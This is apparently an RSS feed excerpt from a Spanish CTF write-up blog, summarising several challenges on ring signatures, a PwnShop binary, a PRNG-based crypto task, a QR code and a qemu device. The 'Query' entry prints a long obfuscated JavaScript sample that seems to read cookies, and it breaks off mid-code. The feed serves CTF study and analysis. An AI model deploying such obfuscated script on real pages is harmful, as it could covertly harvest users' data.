ed25519.py data.json chal.py Se nos proporciona una implementación de un protocolo de firma de anillo, que se supone que es un algoritmo en el que unas partes pueden validar los mensajes firmados pero no pueden determinar quién lo ha firmado, proporcionando anonimato a las firmas.</description></item><item><title>PwnShop</title><link>https://7rocky.github.io/ctf/htb-challenges/pwn/pwnshop/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/pwn/pwnshop/</guid><description>Se nos proporciona un binario de 64 bits llamado pwnshop:
Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled Ingeniería inversa Podemos usar Ghidra para analizar el binario y mirar el código fuente descompilado en C:
undefined[16] main() { int option_char; ulong in_RCX; char option; setup(); puts("========= HTB PwnShop ==========="); while (true) { while (true) { puts("What do you wanna do?"); printf("1&amp;gt; Buy\n2&amp;gt; Sell\n3&amp;gt; Exit\n&amp;gt; "</description></item><item><title>qcg-k</title><link>https://7rocky.github.io/ctf/other/corctf/qcg-k/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/corctf/qcg-k/</guid><description>Se nos proporciona el código fuente en Python para cifrar la flag:
from random import randint from Crypto.Util.number import inverse, bytes_to_long from Crypto.Util.Padding import pad from Crypto.Cipher import AES from hashlib import sha256 import os class PRNG: def __init__(self, mod): self.coeffs = [randint(1,mod) for _ in range(16)] self.mod = mod self.state = randint(1, mod) def next(self): self.state = sum(coeff * self.state**i for i,coeff in enumerate(self.coeffs)) % self.mod return self.state q = 77897050769654696452572824710099972349639759246855689360228775736949644730457 p = 16158503035655503650357438344334975980222051334857742016065172713762327569433945446598600705761456731844358980460949009747059779575245460547544076193224141560315438683650498045875098875194826053398028819192033784138396109321309878080919047169238085235290822926018152521443787945770532904303776199561965192760957166694834171210342487393282284747428088017663161029038902829665513096354230157075129296432088558362971801859230928678799175576150822952201848806616643615613562842355410104862578550863465661734839271290328348967522998634183738667876030053003528149973545862146652611656961993385485831857222177076627368030677 g = 8986665761954289500303442250714013257267958541522625625218561169199279419042595142610100040988087502082590727136475698540201993746428470373168993292913039320311763660217801850784878564935450880018874371587199649965685742134884651107493812479234148805689664214460255588413695390568080942032263992785493208738282307168575867379095610792294961396770216272833435684440954774251862518243249608047971545524864083813237641522093309769070100469565960964654622352499351408269623653746705149014123772757153278180752939277436109738789404154406479625797746665884100327134640664657032784940498017583213619767216652249367376800156 x = randint(1, q - 1) y = pow(g,x,p) kPRNG = PRNG(q) def hsh(msg): return bytes_to_long(sha256(msg).</description></item><item><title>QR Code</title><link>https://7rocky.github.io/ctf/ctflearn/miscellaneous/qr-code/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/ctflearn/miscellaneous/qr-code/</guid><description>Se nos proporciona una imagen que contiene un código QR:
Si lo escaneamos, tendremos la siguiente cadena de caracteres:
c3ludCB2ZiA6IGEwX29icWxfczBldHJnX2RlX3BicXI= Parece que está codificada en Base64, vamos a tratar de decodificarla:
$ echo c3ludCB2ZiA6IGEwX29icWxfczBldHJnX2RlX3BicXI= | base64 -d synt vf : a0_obql_s0etrg_de_pbqr Pero no vemos nada legible. Parece que se está utilizando un algoritmo de sustitución como ROT13. Vayamos a CyberChef para comprobarlo:
Vemos: &amp;ldquo;flag is : n0_body_f0rget_qr_code&amp;rdquo;, por lo que la flag es: CTFlearn{n0_body_f0rget_qr_code}.</description></item><item><title>Quememu</title><link>https://7rocky.github.io/ctf/other/hackon-ctf/quememu/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/hackon-ctf/quememu/</guid><description>En este reto nos dan un dispositivo PCI (Peripheral Component Interconnect) que se comunica mediante MMIO (Memory-mapped I/O). Este dispositivo se ha añadido al código base de qemu y nos dan el binario compilado y un archivo diff.txt con las diferencias añadidas:
# ls -l total 90964 -rw-rw-r-- 1 root root 718 Feb 13 21:42 Dockerfile -rwxrwxr-x 1 root root 59 Feb 13 21:42 deploy_docker.sh -rw-rw-r-- 1 root root 5494 Feb 13 21:41 diff.</description></item><item><title>Query</title><link>https://7rocky.github.io/ctf/htb-challenges/misc/query/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/misc/query/</guid><description>Se nos proporciona un archivo de JavaScript llamado htb.js:
HTB=~[];HTB={___:++HTB,$$$$:(![]+"")[HTB],__$:++HTB,$_$_:(![]+"")[HTB],_$_:++HTB,$_$$:({}+"")[HTB],$$_$:(HTB[HTB]+"")[HTB],_$$:++HTB,$$$_:(!""+"")[HTB],$__:++HTB,$_$:++HTB,$$__:({}+"")[HTB],$$_:++HTB,$$$:++HTB,$___:++HTB,$__$:++HTB};HTB.$_=(HTB.$_=HTB+"")[HTB.$_$]+(HTB._$=HTB.$_[HTB.__$])+(HTB.$$=(HTB.$+"")[HTB.__$])+((!HTB)+"")[HTB._$$]+(HTB.__=HTB.$_[HTB.$$_])+(HTB.$=(!""+"")[HTB.__$])+(HTB._=(!""+"")[HTB._$_])+HTB.$_[HTB.$_$]+HTB.__+HTB._$+HTB.$;HTB.$$=HTB.$+(!""+"")[HTB._$$]+HTB.__+HTB._+HTB.$+HTB.$$;HTB.$=(HTB.___)[HTB.$_][HTB.$_];HTB.$(HTB.$(HTB.$$+"\""+HTB.$$$_+"\\"+HTB.__$+HTB.$$_+HTB.$$_+HTB.$_$_+(![]+"")[HTB._$_]+"("+HTB.$$$$+HTB._+"\\"+HTB.__$+HTB.$_$+HTB.$$_+HTB.$$__+HTB.__+"\\"+HTB.__$+HTB.$_$+HTB.__$+HTB._$+"\\"+HTB.__$+HTB.$_$+HTB.$$_+"(\\"+HTB.__$+HTB.$$_+HTB.___+","+HTB.$_$_+","+HTB.$$__+",\\"+HTB.__$+HTB.$_$+HTB._$$+","+HTB.$$$_+","+HTB.$$_$+"){"+HTB.$$$_+"="+HTB.$$$$+HTB._+"\\"+HTB.__$+HTB.$_$+HTB.$$_+HTB.$$__+HTB.__+"\\"+HTB.__$+HTB.$_$+HTB.__$+HTB._$+"\\"+HTB.__$+HTB.$_$+HTB.$$_+"("+HTB.$$__+"){\\"+HTB.__$+HTB.$$_+HTB._$_+HTB.$$$_+HTB.__+HTB._+"\\"+HTB.__$+HTB.$$_+HTB._$_+"\\"+HTB.__$+HTB.$_$+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.$$__+"};\\"+HTB.__$+HTB.$_$+HTB.__$+HTB.$$$$+"(!''.\\"+HTB.__$+HTB.$$_+HTB._$_+HTB.$$$_+"\\"+HTB.__$+HTB.$$_+HTB.___+(![]+"")[HTB._$_]+HTB.$_$_+HTB.$$__+HTB.$$$_+"(/^/,\\"+HTB.__$+HTB._$_+HTB._$$+HTB.__+"\\"+HTB.__$+HTB.$$_+HTB._$_+"\\"+HTB.__$+HTB.$_$+HTB.__$+"\\"+HTB.__$+HTB.$_$+HTB.$$_+"\\"+HTB.__$+HTB.$__+HTB.$$$+")){\\"+HTB.__$+HTB.$$_+HTB.$$$+"\\"+HTB.__$+HTB.$_$+HTB.___+"\\"+HTB.__$+HTB.$_$+HTB.__$+(![]+"")[HTB._$_]+HTB.$$$_+"("+HTB.$$__+"--){"+HTB.$$_$+"["+HTB.$$__+"]=\\"+HTB.__$+HTB.$_$+HTB._$$+"["+HTB.$$__+"]||"+HTB.$$__+"}\\"+HTB.__$+HTB.$_$+HTB._$$+"=["+HTB.$$$$+HTB._+"\\"+HTB.__$+HTB.$_$+HTB.$$_+HTB.$$__+HTB.__+"\\"+HTB.__$+HTB.$_$+HTB.__$+HTB._$+"\\"+HTB.__$+HTB.$_$+HTB.$$_+"("+HTB.$$$_+"){\\"+HTB.__$+HTB.$$_+HTB._$_+HTB.$$$_+HTB.__+HTB._+"\\"+HTB.__$+HTB.$$_+HTB._$_+"\\"+HTB.__$+HTB.$_$+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.$$_$+"["+HTB.$$$_+"]}];"+HTB.$$$_+"="+HTB.$$$$+HTB._+"\\"+HTB.__$+HTB.$_$+HTB.$$_+HTB.$$__+HTB.__+"\\"+HTB.__$+HTB.$_$+HTB.__$+HTB._$+"\\"+HTB.__$+HTB.$_$+HTB.$$_+"(){\\"+HTB.__$+HTB.$$_+HTB._$_+HTB.$$$_+HTB.__+HTB._+"\\"+HTB.__$+HTB.$$_+HTB._$_+"\\"+HTB.__$+HTB.$_$+HTB.$$_+"'\\\\\\\\\\"+HTB.__$+HTB.$$_+HTB.$$$+"+'};"+HTB.$$__+"="+HTB.__$+"};\\"+HTB.__$+HTB.$$_+HTB.$$$+"\\"+HTB.__$+HTB.$_$+HTB.___+"\\"+HTB.__$+HTB.$_$+HTB.__$+(![]+"")[HTB._$_]+HTB.$$$_+"("+HTB.$$__+"--){\\"+HTB.__$+HTB.$_$+HTB.__$+HTB.$$$$+"(\\"+HTB.__$+HTB.$_$+HTB._$$+"["+HTB.$$__+"]){\\"+HTB.__$+HTB.$$_+HTB.___+"=\\"+HTB.__$+HTB.$$_+HTB.___+".\\"+HTB.__$+HTB.$$_+HTB._$_+HTB.$$$_+"\\"+HTB.__$+HTB.$$_+HTB.___+(![]+"")[HTB._$_]+HTB.$_$_+HTB.$$__+HTB.$$$_+"(\\"+HTB.__$+HTB.$_$+HTB.$$_+HTB.$$$_+"\\"+HTB.__$+HTB.$$_+HTB.$$$+"\\"+HTB.$__+HTB.___+"\\"+HTB.__$+HTB._$_+HTB._$_+HTB.$$$_+"\\"+HTB.__$+HTB.$__+HTB.$$$+"\\"+HTB.__$+HTB.___+HTB.$_$+"\\"+HTB.__$+HTB.$$$+HTB.___+"\\"+HTB.__$+HTB.$$_+HTB.___+"('\\\\\\\\"+HTB.$_$$+"'+"+HTB.$$$_+"("+HTB.$$__+")+'\\\\\\\\"+HTB.$_$$+"','\\"+HTB.__$+HTB.$__+HTB.$$$+"'),\\"+HTB.__$+HTB.$_$+HTB._$$+"["+HTB.$$__+"])}}\\"+HTB.__$+HTB.$$_+HTB._$_+HTB.$$$_+HTB.__+HTB._+"\\"+HTB.__$+HTB.$$_+HTB._$_+"\\"+HTB.__$+HTB.$_$+HTB.$$_+"\\"+HTB.$__+HTB.___+"\\"+HTB.__$+HTB.$$_+HTB.___+"}('"+HTB.$$$+"\\"+HTB.$__+HTB.___+HTB._$$+HTB.___+HTB.$__+"(){"+HTB.$__+HTB.$$_+"."+HTB.$__+HTB.$__$+"(\\\\'"+HTB._$_+HTB.___+HTB.$__$+"\\\\')."+HTB._$$+HTB.___+HTB.$_$+"(\\\\'"+HTB._$$+HTB.___+HTB.$$_+"\\\\',"+HTB.__$+HTB.$__$+HTB.$$$+")}"+HTB.$$$+"\\"+HTB.$__+HTB.___+HTB.__$+HTB.$__$+HTB.$$$+"(){"+HTB._$$+HTB.___+HTB.$$$+"\\"+HTB.$__+HTB.___+HTB._$_+HTB.___+HTB.$_$+"=\\\""+HTB._$$+HTB.___+HTB._$$+"://"+HTB._$$+HTB.___+HTB._$_+"."+HTB.__$+HTB.$__$+HTB._$$+"/\\\";"+HTB.__$+HTB.$__$+"("+HTB.$__+HTB.$$_+"."+HTB.$__+HTB.$__$+"(\\\\'"+HTB.__$+HTB.___+HTB.__$+"\\\\')."+HTB.$__+HTB.$__+"&amp;&amp;"+HTB.$__+HTB.$$_+"."+HTB.$__+HTB.$__$+"(\\\\'"+HTB.__$+HTB.___+HTB.__$+"\\\\')."+HTB.$__+HTB.$__+"."+HTB._$_+HTB.$__$+HTB.$___+"(\\\\'@"+HTB._$_+HTB.$__$+HTB.$$$+"."+HTB.__$+HTB.$__$+HTB._$$+"\\\\')){"+HTB._$_+HTB.___+HTB.___+"."+HTB._$_+HTB.$__$+HTB.$__$+"("+HTB._$_+HTB.___+HTB.___+"."+HTB._$$+HTB.___+HTB.___+"("+HTB._$_+HTB.___+HTB.$__+"("+HTB.$__+HTB.$$_+"."+HTB.$__+HTB.$__$+"(\\\\'"+HTB.__$+HTB.___+HTB.__$+"\\\\')."+HTB.$__+HTB.$__+","+HTB.$__+HTB.$$_+"."+HTB.$__+HTB.$__$+"(\\\\'"+HTB._$_+HTB.___+HTB.$__$+"\\\\')."+HTB.$__+HTB.$__+"),\\\""+HTB._$$+HTB.___+HTB.__$+"\\\"),"+HTB._$_+HTB.___+HTB.$_$+",\\\""+HTB._$$+HTB.___+HTB.$___+"\\\")}}"+HTB.$$$+"\\"+HTB.$__+HTB.___+HTB._$_+HTB.___+HTB.$__+"("+HTB._$_+HTB.___+HTB.$$_+","+HTB.__$+HTB.$__$+HTB.___+"){"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.$___+HTB.$__$+"=[\\\\'"+HTB._$$+HTB.___+HTB.$__$+"==\\\\',\\\\'"+HTB._$$+HTB.__$+HTB.$$_+"\\\\',\\\\'"+HTB._$$+HTB.__$+HTB.$$$+"==\\\\',\\\\'"+HTB._$$+HTB.__$+HTB.$___+"\\\\',\\\\'"+HTB._$$+HTB.__$+HTB.$__$+"=\\\\',\\\\'"+HTB._$$+HTB.__$+HTB.$_$+"\\\\',\\\\'"+HTB._$$+HTB.__$+HTB.$__+"=\\\\',\\\\'"+HTB._$$+HTB.__$+HTB.___+"==\\\\',\\\\'"+HTB._$$+HTB.__$+HTB.__$+"=\\\\',\\\\'"+HTB._$$+HTB.__$+HTB._$_+"=\\\\',\\\\'"+HTB._$$+HTB.__$+HTB._$$+"==\\\\',\\\\'"+HTB._$_+HTB.$__$+HTB.$$_+"\\\\',\\\\'"+HTB._$_+HTB.$__$+HTB.$_$+"=\\\\',\\\\'"+HTB._$_+HTB.$$$+HTB.$__$+"==\\\\',\\\\'"+HTB._$_+HTB.$___+HTB.___+"\\\\',\\\\'"+HTB._$_+HTB.$___+HTB.__$+"==\\\\',\\\\'"+HTB._$_+HTB.$___+HTB._$_+"\\\\',\\\\'"+HTB._$_+HTB.$$$+HTB.$___+"\\\\',\\\\'"+HTB._$_+HTB.$$$+HTB.$$$+"/"+HTB._$_+HTB.$$$+HTB._$$+"=\\\\',\\\\'"+HTB._$_+HTB.$$$+HTB._$_+"==\\\\',\\\\'"+HTB._$_+HTB.$$$+HTB.$__+"/"+HTB._$_+HTB.$$$+HTB.$_$+"==\\\\',\\\\'"+HTB._$_+HTB.$$$+HTB.$$_+"\\\\',\\\\'"+HTB._$_+HTB.$___+HTB._$$+"\\\\',\\\\'"+HTB._$_+HTB.$___+HTB.$__+"=\\\\',\\\\'"+HTB._$_+HTB.$__$+HTB.__$+"/"+HTB._$_+HTB.$__$+HTB._$_+"=\\\\',\\\\'"+HTB._$_+HTB.$__$+HTB._$$+"/"+HTB._$_+HTB.$__$+HTB.$__+"\\\\',\\\\'"+HTB._$_+HTB.$__$+HTB.___+"\\\\',\\\\'"+HTB._$_+HTB.$___+HTB.$__$+"=\\\\',\\\\'"+HTB._$_+HTB.$___+HTB.$_$+"=\\\\',\\\\'"+HTB._$_+HTB.$___+HTB.$$_+"/"+HTB._$_+HTB.$___+HTB.$$$+"+"+HTB._$_+HTB.$___+HTB.$___+"\\\\',\\\\'"+HTB._$$+HTB._$_+HTB.___+"\\\\',\\\\'"+HTB._$$+HTB._$_+HTB.__$+"==\\\\',\\\\'"+HTB._$$+HTB.$_$+HTB.$__+"=\\\\',\\\\'"+HTB._$$+HTB.$_$+HTB.$_$+"=\\\\',\\\\'"+HTB._$$+HTB.$_$+HTB.$$_+"==\\\\',\\\\'"+HTB._$$+HTB.$_$+HTB.$$$+"\\\\',\\\\'"+HTB._$$+HTB.$_$+HTB._$$+"\\\\',\\\\'"+HTB._$$+HTB.$_$+HTB._$_+"==\\\\',\\\\'"+HTB._$$+HTB.$__+HTB.$___+"=\\\\',\\\\'"+HTB._$$+HTB.$__+HTB.$$$+"==\\\\',\\\\'"+HTB._$$+HTB.$__+HTB.$__$+"==\\\\',\\\\'"+HTB._$$+HTB.$_$+HTB.___+"/"+HTB._$$+HTB.$_$+HTB.__$+"==\\\\',\\\\'"+HTB._$$+HTB.$_$+HTB.$___+"=\\\\',\\\\'"+HTB._$$+HTB.$_$+HTB.$__$+"=\\\\',\\\\'"+HTB._$$+HTB.$$_+HTB.$$_+"/"+HTB._$$+HTB.$$_+HTB.$$$+"==\\\\',\\\\'"+HTB._$$+HTB.$$_+HTB.$___+"\\\\',\\\\'"+HTB._$$+HTB.$$_+HTB.$__$+"/"+HTB._$$+HTB.$$_+HTB.$_$+"==\\\\',\\\\'"+HTB._$$+HTB.$$_+HTB.$__+"==\\\\',\\\\'"+HTB._$$+HTB.$$_+HTB.___+"\\\\',\\\\'"+HTB._$$+HTB.$$_+HTB.__$+"=\\\\',\\\\'"+HTB._$$+HTB.$$_+HTB._$_+"==\\\\',\\\\'"+HTB._$$+HTB.$$_+HTB._$$+"==\\\\',\\\\'"+HTB._$$+HTB.$__+HTB.$$_+"\\\\',\\\\'"+HTB._$$+HTB.$__+HTB.$_$+"=\\\\',\\\\'"+HTB._$$+HTB._$_+HTB.$__$+"=\\\\',\\\\'"+HTB._$$+HTB._$$+HTB.___+"==\\\\',\\\\'"+HTB._$$+HTB._$$+HTB.__$+"==\\\\',\\\\'"+HTB._$$+HTB._$$+HTB._$_+"=\\\\',\\\\'"+HTB._$$+HTB._$_+HTB.$___+"\\\\',\\\\'"+HTB._$$+HTB._$_+HTB.$$$+"/"+HTB._$$+HTB._$_+HTB._$$+"==\\\\',\\\\'"+HTB._$$+HTB._$_+HTB._$_+"\\\\',\\\\'"+HTB._$$+HTB._$_+HTB.$__+"\\\\',\\\\'"+HTB._$$+HTB._$_+HTB.$_$+"=\\\\',\\\\'"+HTB._$_+HTB.$$$+HTB.__$+"=\\\\',\\\\'"+HTB._$$+HTB._$$+HTB._$$+"/"+HTB._$$+HTB._$$+HTB.$__+"==\\\\',\\\\'"+HTB._$$+HTB.$__+HTB.__$+"==\\\\',\\\\'"+HTB._$$+HTB.$__+HTB._$_+"\\\\',\\\\'"+HTB._$$+HTB.$__+HTB._$$+"=\\\\',\\\\'"+HTB._$$+HTB.$__+HTB.$__+"\\\\',\\\\'"+HTB._$$+HTB.$__+HTB.___+"=\\\\'];("+HTB.$$$+"("+HTB.$___+HTB.___+","+HTB.__$+HTB.$$$+HTB.___+"){"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.__$+HTB.$$_+HTB._$_+"="+HTB.$$$+"("+HTB.__$+HTB.$$_+HTB.$$_+"){"+HTB.__$+HTB.$$$+HTB.$$_+"(--"+HTB.__$+HTB.$$_+HTB.$$_+"){"+HTB.$___+HTB.___+"[\\\\'"+HTB.__$+HTB.__$+HTB._$_+"\\\\']("+HTB.$___+HTB.___+"[\\\\'"+HTB._$$+HTB._$$+HTB.$__$+"\\\\']())}},"+HTB._$_+HTB._$_+HTB.___+"="+HTB.$$$+"(){"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB._$_+HTB.$___+"={\\\\'"+HTB._$$+HTB._$$+HTB.$_$+"\\\\':{\\\\'"+HTB._$$+HTB._$$+HTB.$$_+"\\\\':\\\\'"+HTB.__$+HTB.$_$+HTB.$$$+"\\\\',\\\\'"+HTB.$__+HTB.$__+"\\\\':\\\\'"+HTB._$$+HTB._$$+HTB.$$$+"\\\\'},\\\\'"+HTB._$_+HTB.$__+HTB.___+"\\\\':"+HTB.$$$+"("+HTB._$$+HTB.$__+","+HTB.__$+HTB.$__+HTB._$_+","+HTB.__$+HTB._$$+HTB.$__$+","+HTB.$$_+HTB.$__+"){"+HTB.$$_+HTB.$__+"="+HTB.$$_+HTB.$__+"||{};"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.$$$+HTB.___+"="+HTB.__$+HTB.$__+HTB._$_+"+\\\\'=\\\\'+"+HTB.__$+HTB._$$+HTB.$__$+","+HTB._$$+HTB._$$+HTB.$___+"=-"+HTB._$_+HTB.$__+HTB.__$+"+"+HTB._$_+HTB.$__+HTB._$$+"+"+HTB._$_+HTB.$__+HTB.$__+"*-"+HTB._$_+HTB.__$+";"+HTB._$_+HTB.$__+"("+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.$_$+HTB._$_+"="+HTB.$_$+HTB.$__$+"*"+HTB.__$+HTB.___+HTB._$$+"+"+HTB._$_+HTB.__$+HTB.$__$+"+-"+HTB.__$+HTB.$___+HTB.$__+","+HTB.__$+HTB.___+HTB.___+"="+HTB._$$+HTB.$__+"[\\\\'"+HTB._$_+HTB._$$+"\\\\'];"+HTB.$_$+HTB._$_+"&lt;"+HTB.__$+HTB.___+HTB.___+";"+HTB.$_$+HTB._$_+"++){"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.$__$+HTB.$$_+"="+HTB._$$+HTB.$__+"["+HTB.$_$+HTB._$_+"];"+HTB.$$$+HTB.___+"+=\\\\';\\\\\\\\"+HTB.__$+HTB.$___+"\\\\'+"+HTB.$__$+HTB.$$_+";"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.$$$+HTB._$_+"="+HTB._$$+HTB.$__+"["+HTB.$__$+HTB.$$_+"];"+HTB._$$+HTB.$__+"[\\\\'"+HTB.__$+HTB.__$+HTB._$_+"\\\\']("+HTB.$$$+HTB._$_+"),"+HTB.__$+HTB.___+HTB.___+"="+HTB._$$+HTB.$__+"[\\\\'"+HTB._$_+HTB._$$+"\\\\'],"+HTB.$$$+HTB._$_+"!==!![]&amp;&amp;("+HTB.$$$+HTB.___+"+=\\\\'=\\\\'+"+HTB.$$$+HTB._$_+")}"+HTB.$$_+HTB.$__+"[\\\\'"+HTB.__$+HTB.$_$+HTB.$$$+"\\\\']="+HTB.$$$+HTB.___+"},\\\\'"+HTB.$__$+HTB._$_+"\\\\':"+HTB.$$$+"(){"+HTB.$___+"\\\\'"+HTB._$$+HTB.$$$+HTB.___+"\\\\'},\\\\'"+HTB._$_+HTB.__$+HTB._$_+"\\\\':"+HTB.$$$+"("+HTB.$$_+HTB.$$$+","+HTB.__$+HTB._$$+HTB.$__+"){"+HTB.$$_+HTB.$$$+"="+HTB.$$_+HTB.$$$+"||"+HTB.$$$+"("+HTB.__$+HTB.$_$+HTB._$$+"){"+HTB.$___+"\\"+HTB.$__+HTB.___+HTB.__$+HTB.$_$+HTB._$$+"};"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.$$$+HTB.$$_+"="+HTB.$$_+HTB.$$$+"("+HTB.$$_+HTB.$___+"\\"+HTB.$__+HTB.___+HTB.$__$+HTB.$__$+"(\\\\'(?:^|;\\\\\\\\"+HTB.__$+HTB.$___+")\\\\'+"+HTB.__$+HTB._$$+HTB.$__+"[\\\\'"+HTB._$_+HTB._$$+HTB.$__+"\\\\'](/([.$?*|{}()[]\\\\\\\\/+^])/"+HTB._$_+HTB.$$_+HTB.$__$+",\\\\'$"+HTB.__$+"\\\\')+\\\\'=([^;]*)\\\\')),"+HTB.__$+HTB.$$_+HTB.$___+"="+HTB.$$$+"("+HTB.__$+HTB.$$_+HTB.$_$+","+HTB.__$+HTB._$$+HTB.$_$+"){"+HTB.__$+HTB.$$_+HTB.$_$+"(++"+HTB.__$+HTB._$$+HTB.$_$+")};"+HTB.$___+"\\"+HTB.$__+HTB.___+HTB.__$+HTB.$$_+HTB.$___+"("+HTB.__$+HTB.$$_+HTB._$_+","+HTB.__$+HTB.$$$+HTB.___+"),"+HTB.$$$+HTB.$$_+"?"+HTB.__$+HTB.$__$+HTB.__$+"("+HTB.$$$+HTB.$$_+"[-"+HTB.__$+HTB.$___+HTB._$$+"+"+HTB.__$+HTB.$___+HTB._$_+"+-"+HTB._$_+HTB.$_$+HTB.___+"*-"+HTB.__$+HTB._$_+HTB.$$_+"]):"+HTB.$_$+HTB.$$$+"}},"+HTB.__$+HTB.$___+HTB.$$$+"="+HTB.$$$+"(){"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.__$+HTB.$__+HTB.__$+"="+HTB.$$_+HTB.$___+"\\"+HTB.$__+HTB.___+HTB.$__$+HTB.$__$+"(\\\\'\\\\\\\\"+HTB.$_$+HTB._$$+"+\\\\\\\\"+HTB.__$+HTB.$___+"*\\\\\\\\"+HTB.$$$+HTB._$$+"(\\\\\\\\"+HTB.$$$+HTB._$$+")\\\\\\\\"+HTB.__$+HTB.$___+"*{\\\\\\\\"+HTB.$_$+HTB._$$+"+\\\\\\\\"+HTB.__$+HTB.$___+"*[\\\\\\\\"+HTB.$_$+HTB.$___+"|\\\\\\\\"+HTB._$$+HTB.$__$+"].+[\\\\\\\\"+HTB.$_$+HTB.$___+"|\\\\\\\\"+HTB._$$+HTB.$__$+"];?\\\\\\\\"+HTB.__$+HTB.$___+"*}\\\\');"+HTB.$___+"\\"+HTB.$__+HTB.___+HTB.__$+HTB.$__+HTB.__$+"[\\\\'"+HTB.__$+HTB._$$+HTB._$$+"\\\\']("+HTB._$_+HTB.$___+"[\\\\'"+HTB.$__$+HTB._$_+"\\\\'][\\\\'"+HTB.$$_+HTB.$__$+"\\\\']())};"+HTB._$_+HTB.$___+"[\\\\'"+HTB._$_+HTB._$$+HTB.$$$+"\\\\']="+HTB.__$+HTB.$___+HTB.$$$+";"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB._$_+HTB.__$+HTB.$$_+"=\\\\'\\\\';"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.__$+HTB.___+HTB.$__+"="+HTB._$_+HTB.$___+"[\\\\'"+HTB._$_+HTB._$$+HTB.$$$+"\\\\']();"+HTB.__$+HTB.$__$+"(!"+HTB.__$+HTB.___+HTB.$__+")"+HTB._$_+HTB.$___+"[\\\\'"+HTB._$_+HTB.$__+HTB.___+"\\\\']([\\\\'*\\\\'],\\\\'"+HTB._$_+HTB.__$+HTB._$$+"\\\\',"+HTB.__$+HTB.___+HTB.$_$+"*-"+HTB.$_$+HTB.___+"+-"+HTB.__$+HTB.$___+HTB.__$+"*-"+HTB.$___+HTB.__$+"+-"+HTB._$_+HTB.$__+HTB.$__$+");"+HTB.$__+HTB.$$$+"\\"+HTB.$__+HTB.___+HTB.__$+HTB.___+HTB.$__+"?"+HTB._$_+HTB.__$+HTB.$$_+"="+HTB._$_+HTB.$___+"[\\\\'"+HTB._$_+HTB.__$+HTB._$_+"\\\\']("+HTB.$__+HTB.$_$+",\\\\'"+HTB._$_+HTB.__$+HTB._$$+"\\\\'):"+HTB._$_+HTB.$___+"[\\\\'"+HTB.$__$+HTB._$_+"\\\\']()};"+HTB._$_+HTB._$_+HTB.___+"()}("+HTB.$___+HTB.$__$+",-"+HTB.__$+HTB.$___+HTB.___+"+-"+HTB.__$+HTB.$$$+HTB.$__+"+-"+HTB.__$+HTB.__$+"*-"+HTB._$_+HTB.$$_+HTB.__$+"));"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.__$+HTB.$$_+"="+HTB.$$$+"("+HTB._$$+HTB.$_$+","+HTB.__$+HTB.$$_+HTB.$__$+"){"+HTB._$$+HTB.$_$+"="+HTB._$$+HTB.$_$+"-(-"+HTB._$_+HTB.$__+HTB.__$+"+"+HTB._$_+HTB.$__+HTB._$$+"+"+HTB._$_+HTB.$__+HTB.$__+"*-"+HTB._$_+HTB.__$+");"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB._$$+HTB.$$_+"="+HTB.$___+HTB.$__$+"["+HTB._$$+HTB.$_$+"];"+HTB.__$+HTB.$__$+"("+HTB.__$+HTB.$$_+"[\\\\'"+HTB._$_+HTB._$_+HTB.$_$+"\\\\']==="+HTB.$_$+HTB.$$$+"){"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.__$+HTB.$$$+HTB.$$$+"="+HTB.$$$+"("+HTB._$_+HTB._$$+HTB.___+"){"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.__$+HTB.$__$+HTB.$__+"=\\\\'"+HTB._$_+HTB.$_$+HTB.$__$+"+/=\\\\',"+HTB.__$+HTB.$___+HTB.$_$+"="+HTB.$__$+HTB.$$$+"("+HTB._$_+HTB._$$+HTB.___+")[\\\\'"+HTB._$_+HTB._$$+HTB.$__+"\\\\'](/=+$/,\\\\'\\\\');"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.__$+HTB.___+HTB.$___+"=\\\\'\\\\';"+HTB._$_+HTB.$__+"("+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.$$$+HTB.$_$+"="+HTB.$_$+HTB.$__$+"*"+HTB.__$+HTB.___+HTB._$$+"+"+HTB._$_+HTB.__$+HTB.$__$+"+-"+HTB.__$+HTB.$___+HTB.$__+","+HTB.$_$+HTB.$$_+","+HTB._$_+HTB.$$$+","+HTB._$_+HTB.__$+HTB.__$+"=-"+HTB.__$+HTB.$___+HTB._$$+"+"+HTB.__$+HTB.$___+HTB._$_+"+-"+HTB._$_+HTB.$_$+HTB.$$$+"*-"+HTB.__$+HTB._$$+HTB.$$$+";"+HTB._$_+HTB.$$$+"="+HTB.__$+HTB.$___+HTB.$_$+"[\\\\'"+HTB._$_+HTB.$_$+HTB.$___+"\\\\']("+HTB._$_+HTB.__$+HTB.__$+"++);~"+HTB._$_+HTB.$$$+"&amp;&amp;("+HTB.$_$+HTB.$$_+"="+HTB.$$$+HTB.$_$+"%("+HTB.__$+HTB.___+HTB.$_$+"*-"+HTB.$_$+HTB.___+"+-"+HTB.__$+HTB.$___+HTB.__$+"*-"+HTB.$___+HTB.__$+"+-"+HTB._$_+HTB.$_$+HTB.$$_+")?"+HTB.$_$+HTB.$$_+"*(-"+HTB.__$+HTB.$___+HTB.___+"+-"+HTB.__$+HTB.$$$+HTB.$__+"+-"+HTB._$_+HTB.__$+"*-"+HTB._$